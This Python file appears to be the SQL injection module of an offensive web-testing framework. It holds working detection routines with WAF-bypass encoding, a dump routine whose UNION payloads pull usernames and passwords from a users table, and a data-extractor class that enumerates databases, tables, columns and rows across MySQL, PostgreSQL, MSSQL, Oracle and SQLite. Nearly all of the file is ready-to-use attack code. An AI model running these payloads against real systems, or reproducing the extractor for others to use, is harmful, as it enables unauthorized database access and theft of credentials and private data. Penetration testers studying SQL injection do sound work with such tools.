#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SQL Injection Module
Advanced SQLi detection and exploitation
"""

import re
import time


from config import Payloads, Colors


class SQLiModule:
    """SQL Injection Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "SQL Injection"
        
        # SQL Error signatures
        self.error_signatures = {
            'mysql': [
                'sql syntax', 'mysql_fetch', 'mysql_query', 'mysqli_',
                'you have an error in your sql syntax',
                'warning: mysql', 'mysqli_error',
                'unclosed quote', 'quoted string not properly terminated',
                'unknown column', 'table', 'doesn\'t exist',
            ],
            'postgresql': [
                'pg_query', 'pg_exec', 'postgresql', 'psql',
                'syntax error at or near',
                'warning: pg_',
            ],
            'mssql': [
                'microsoft sql', 'mssql', 'sql server',
                'odbc sql server driver',
                'unclosed quotation mark',
                'incorrect syntax near',
            ],
            'oracle': [
                'ora-', 'oracle', 'ora_error',
                'quoted string not properly terminated',
                'sql command not properly ended',
            ],
            'sqlite': [
                'sqlite_query', 'sqlite3',
                'near ".*": syntax error',
                'unrecognized token',
            ],
            'generic': [
                'sql syntax', 'syntax error', 'unexpected',
                'sqlstate', 'jdbc', 'odbc',
            ],
        }
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for SQL Injection"""
        # Test error-based SQLi
        self._test_error_based(url, method, param, value)
        
        # Test time-based SQLi
        self._test_time_based(url, method, param, value)
        
        # Test union-based SQLi
        self._test_union_based(url, method, param, value)
        
        # Test boolean-based SQLi
        self._test_boolean_based(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for SQLi"""
        pass  # URL-based tests handled by parameter tests
    
    def _test_error_based(self, url: str, method: str, param: str, value: str):
        """Test for error-based SQLi"""
        payloads = Payloads.SQLI_ERROR_BASED
        
        # Apply WAF bypass if enabled
        if self.engine.config.get('waf_bypass'):
            all_payloads = []
            for p in payloads:
                all_payloads.extend(self.requester.waf_bypass_encode(p))
            payloads = list(set(all_payloads))
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for SQL errors
                response_text = response.text.lower()
                detected_db = None
                
                for db_type, signatures in self.error_signatures.items():
                    for sig in signatures:
                        if sig.lower() in response_text:
                            detected_db = db_type
                            break
                    if detected_db:
                        break
                
                if detected_db:
                    from core.engine import Finding
                    finding = Finding(
                        technique=f"SQL Injection ({detected_db.upper()})",
                        url=url,
                        severity='HIGH',
                        confidence=0.9,
                        param=param,
                        payload=payload,
                        evidence=f"Database error detected: {detected_db}",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'SQLi test error: {e}')}")
    
    def _test_time_based(self, url: str, method: str, param: str, value: str):
        """Test for time-based blind SQLi"""
        payloads = Payloads.SQLI_TIME_BASED
        
        # Measure baseline response time first
        try:
            baseline_data = {param: value}
            baseline_start = time.time()
            self.requester.request(url, method, data=baseline_data)
            baseline_time = time.time() - baseline_start
        except Exception:
            baseline_time = 0
        
        for payload in payloads:
            try:
                data = {param: payload}
                
                start_time = time.time()
                response = self.requester.request(url, method, data=data)
                elapsed = time.time() - start_time
                
                # Response must take significantly longer than baseline
                # and at least 4.8s (for SLEEP(5) payloads)
                if elapsed >= 4.8 and elapsed > baseline_time + 4.0:
                    from core.engine import Finding
                    finding = Finding(
                        technique="SQL Injection (Time-based Blind)",
                        url=url,
                        severity='HIGH',
                        confidence=0.8,
                        param=param,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'Time-based SQLi test error: {e}')}")
    
    def _test_union_based(self, url: str, method: str, param: str, value: str):
        """Test for UNION-based SQLi"""
        payloads = Payloads.SQLI_UNION_BASED
        
        # Get baseline response for comparison
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            baseline_text = baseline.text if baseline else ''
        except Exception:
            baseline_text = ''
        
        # Test with incrementing column count
        for i in range(1, 10):
            try:
                nulls = ','.join(['NULL'] * i)
                payload = f"' UNION SELECT {nulls} --"
                
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check if UNION was successful (no error and different response)
                if response.status_code == 200:
                    response_text = response.text
                    
                    # Response must differ from baseline (UNION added data)
                    if abs(len(response_text) - len(baseline_text)) < 20:
                        continue
                    
                    # Check for database-specific info in response that was NOT in baseline
                    db_patterns = [
                        r'mysql|postgresql|mssql|oracle|sqlite',
                        r'ubuntu|debian|centos|redhat',
                    ]
                    
                    for pattern in db_patterns:
                        match = re.search(pattern, response_text, re.IGNORECASE)
                        if match and match.group(0).lower() not in baseline_text.lower():
                            from core.engine import Finding
                            finding = Finding(
                                technique="SQL Injection (UNION-based)",
                                url=url,
                                severity='CRITICAL',
                                confidence=0.85,
                                param=param,
                                payload=payload,
                                evidence=f"UNION query returned new data: {match.group(0)}",
                            )
                            self.engine.add_finding(finding)
                            return
                            
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'UNION SQLi test error: {e}')}")
    
    def _test_boolean_based(self, url: str, method: str, param: str, value: str):
        """Test for boolean-based blind SQLi"""
        try:
            # Get baseline response
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            
            if not baseline:
                return
            
            baseline_len = len(baseline.text)
            
            # Test true condition
            true_payload = f"{value}' AND '1'='1"
            true_data = {param: true_payload}
            true_response = self.requester.request(url, method, data=true_data)
            
            # Test false condition
            false_payload = f"{value}' AND '1'='2"
            false_data = {param: false_payload}
            false_response = self.requester.request(url, method, data=false_data)
            
            if true_response and false_response:
                true_len = len(true_response.text)
                false_len = len(false_response.text)
                
                # If TRUE and FALSE responses differ significantly from each other,
                # and TRUE response is closer to baseline, likely boolean-based SQLi
                diff_true_false = abs(true_len - false_len)
                diff_baseline_true = abs(baseline_len - true_len)
                
                if diff_true_false > 50 and diff_baseline_true < diff_true_false:
                    from core.engine import Finding
                    finding = Finding(
                        technique="SQL Injection (Boolean-based Blind)",
                        url=url,
                        severity='HIGH',
                        confidence=0.75,
                        param=param,
                        payload=true_payload,
                        evidence=f"Response differs between TRUE ({true_len}) and FALSE ({false_len})",
                    )
                    self.engine.add_finding(finding)
                    
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'Boolean SQLi test error: {e}')}")
    
    def exploit_dump_database(self, url: str, param: str, db_type: str = 'mysql'):
        """Attempt to dump database"""
        print(f"{Colors.info(f'Attempting to dump {db_type} database...')}")
        
        if db_type == 'mysql':
            queries = [
                "' UNION SELECT null,schema_name,null FROM information_schema.schemata --",
                "' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database() --",
                "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users' --",
                "' UNION SELECT null,concat(username,':',password),null FROM users --",
            ]
        elif db_type == 'postgresql':
            queries = [
                "' UNION SELECT null,datname,null FROM pg_database --",
                "' UNION SELECT null,tablename,null FROM pg_tables --",
            ]
        else:
            queries = []
        
        results = []
        for query in queries:
            try:
                data = {param: query}
                response = self.requester.request(url, 'POST', data=data)
                if response:
                    results.append({
                        'query': query,
                        'response': response.text,
                    })
            except Exception as e:
                print(f"{Colors.error(f'Dump error: {e}')}")
        
        return results


class SQLiDataExtractor:
    """Extract data through confirmed SQL injection vulnerabilities.

    Supports UNION-based extraction for MySQL, PostgreSQL, MSSQL, Oracle and
    SQLite.  Each ``extract_*`` method sends one or more crafted payloads and
    parses the response to pull out the requested information.
    """

    # Column-count discovery limits
    _MAX_COLUMNS = 20

    # DB-specific queries for information schema
    _INFO_QUERIES = {
        'mysql': {
            'version': 'SELECT @@version',
            'current_db': 'SELECT database()',
            'current_user': 'SELECT user()',
            'databases': "SELECT schema_name FROM information_schema.schemata",
            'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
            'columns': "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
            'rows': "SELECT {cols} FROM {db}.{table} LIMIT {limit} OFFSET {offset}",
        },
        'postgresql': {
            'version': 'SELECT version()',
            'current_db': 'SELECT current_database()',
            'current_user': 'SELECT current_user',
            'databases': "SELECT datname FROM pg_database",
            'tables': "SELECT tablename FROM pg_tables WHERE schemaname='public'",
            'columns': "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
            'rows': "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        },
        'mssql': {
            'version': 'SELECT @@version',
            'current_db': 'SELECT DB_NAME()',
            'current_user': 'SELECT SYSTEM_USER',
            'databases': "SELECT name FROM master.sys.databases",
            'tables': "SELECT name FROM {db}.sys.tables",
            'columns': "SELECT name FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{db}.dbo.{table}')",
            'rows': "SELECT TOP {limit} {cols} FROM {db}.dbo.{table}",
        },
        'oracle': {
            'version': 'SELECT banner FROM v$version WHERE ROWNUM=1',
            'current_db': 'SELECT ora_database_name FROM dual',
            'current_user': 'SELECT user FROM dual',
            'databases': "SELECT DISTINCT owner FROM all_tables",
            'tables': "SELECT table_name FROM all_tables WHERE owner='{db}'",
            'columns': "SELECT column_name FROM all_tab_columns WHERE table_name='{table}' AND owner='{db}'",
            'rows': "SELECT {cols} FROM {db}.{table} WHERE ROWNUM<={limit}",
        },
        'sqlite': {
            'version': 'SELECT sqlite_version()',
            'current_db': "SELECT 'main'",
            'current_user': "SELECT 'default'",
            'databases': "SELECT 'main'",
            'tables': "SELECT name FROM sqlite_master WHERE type='table'",
            'columns': "SELECT name FROM pragma_table_info('{table}')",
            'rows': "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        },
    }

    def __init__(self, requester, *, db_type: str = 'mysql',
                 num_columns: int = 0, injectable_index: int = 1,
                 prefix: str = "'", suffix: str = " --",
                 method: str = 'GET'):
        self.requester = requester
        self.db_type = db_type.lower()
        self.num_columns = num_columns
        self.injectable_index = injectable_index
        self.prefix = prefix
        self.suffix = suffix
        self.method = method
        self._marker_tag = 'AAAXTRCTAAA'

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _build_union_payload(self, inner_query: str) -> str:
        """Build a full UNION SELECT payload injecting *inner_query* at the
        injectable column position.  Other columns are filled with NULL."""
        cols = []
        for i in range(self.num_columns):
            if i == self.injectable_index:
                cols.append(self._wrap_concat(inner_query))
            else:
                cols.append('NULL')
        return f"{self.prefix} UNION SELECT {','.join(cols)}{self.suffix}"

    def _wrap_concat(self, expr: str) -> str:
        """Wrap *expr* in database-specific string concatenation with
        the extraction markers."""
        tag = self._marker_tag
        if self.db_type in ('mysql', 'sqlite'):
            return f"CONCAT('{tag}',({expr}),'{tag}')"
        elif self.db_type == 'postgresql':
            return f"'{tag}'||({expr})||'{tag}'"
        elif self.db_type == 'mssql':
            return f"'{tag}'+CAST(({expr}) AS VARCHAR)+'{tag}'"
        elif self.db_type == 'oracle':
            return f"'{tag}'||({expr})||'{tag}'"
        return f"CONCAT('{tag}',({expr}),'{tag}')"

    def _send(self, url: str, param: str, payload: str):
        """Fire the payload and return the response text or ''."""
        data = {param: payload}
        try:
            resp = self.requester.request(url, self.method, data=data)
            return resp.text if resp else ''
        except Exception:
            return ''

    def _extract_between_markers(self, text: str) -> list:
        """Return all strings enclosed between the extractor markers."""
        results = []
        tag = self._marker_tag
        parts = text.split(tag)
        # Parts at odd indices (1, 3, 5, …) are the extracted values
        for i in range(1, len(parts), 2):
            val = parts[i].strip()
            if val:
                results.append(val)
        return results

    # ------------------------------------------------------------------
    # Column-count detection
    # ------------------------------------------------------------------

    def detect_columns(self, url: str, param: str) -> int:
        """Detect the number of columns via ``ORDER BY`` probing."""
        for n in range(1, self._MAX_COLUMNS + 1):
            payload = f"{self.prefix} ORDER BY {n}{self.suffix}"
            text = self._send(url, param, payload)
            # If the response contains an error the previous count was valid
            error_keywords = ['error', 'unknown column', 'order by',
                              'sqlstate', 'syntax']
            if any(kw in text.lower() for kw in error_keywords):
                self.num_columns = n - 1
                return self.num_columns
        self.num_columns = 0
        return 0

    # ------------------------------------------------------------------
    # Public extraction methods
    # ------------------------------------------------------------------

    def extract_version(self, url: str, param: str) -> str:
        """Return the database server version string."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get('version', '')
        if not q:
            return ''
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        results = self._extract_between_markers(text)
        return results[0] if results else ''

    def extract_current_db(self, url: str, param: str) -> str:
        """Return the name of the current database."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get('current_db', '')
        if not q:
            return ''
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        results = self._extract_between_markers(text)
        return results[0] if results else ''

    def extract_current_user(self, url: str, param: str) -> str:
        """Return the current database user."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get('current_user', '')
        if not q:
            return ''
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        results = self._extract_between_markers(text)
        return results[0] if results else ''

    def extract_databases(self, url: str, param: str) -> list:
        """Return a list of database/schema names."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get('databases', '')
        if not q:
            return []
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        return self._extract_between_markers(text)

    def extract_tables(self, url: str, param: str, db: str = '') -> list:
        """Return table names for the given database."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get('tables', '')
        if not q:
            return []
        q = q.format(db=db)
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        return self._extract_between_markers(text)

    def extract_columns(self, url: str, param: str,
                        table: str, db: str = '') -> list:
        """Return column names for the given table."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get('columns', '')
        if not q:
            return []
        q = q.format(table=table, db=db)
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        return self._extract_between_markers(text)

    def extract_rows(self, url: str, param: str, table: str,
                     columns: list, *, db: str = '',
                     limit: int = 10, offset: int = 0) -> list:
        """Return rows from the given table as a list of dicts."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get('rows', '')
        if not q or not columns:
            return []
        # Sanitise column names – only allow alphanumeric + underscore
        import re as _re
        safe_cols = [c for c in columns if _re.fullmatch(r'[A-Za-z_]\w*', c)]
        if not safe_cols:
            return []
        # Build DB-specific row concatenation
        if self.db_type in ('mysql', 'sqlite'):
            concat_expr = "CONCAT_WS(',', " + ','.join(safe_cols) + ")"
        elif self.db_type == 'postgresql':
            concat_expr = ' || \',\' || '.join(safe_cols)
        elif self.db_type == 'mssql':
            casts = [f"CAST({c} AS VARCHAR)" for c in safe_cols]
            concat_expr = " + ',' + ".join(casts)
        elif self.db_type == 'oracle':
            concat_expr = " || ',' || ".join(safe_cols)
        else:
            concat_expr = "CONCAT_WS(',', " + ','.join(safe_cols) + ")"
        q = q.format(cols=concat_expr, db=db, table=table,
                     limit=limit, offset=offset)
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        raw = self._extract_between_markers(text)
        rows = []
        for line in raw:
            parts = line.split(',')
            row = {}
            for i, col in enumerate(safe_cols):
                row[col] = parts[i] if i < len(parts) else ''
            rows.append(row)
        return rows
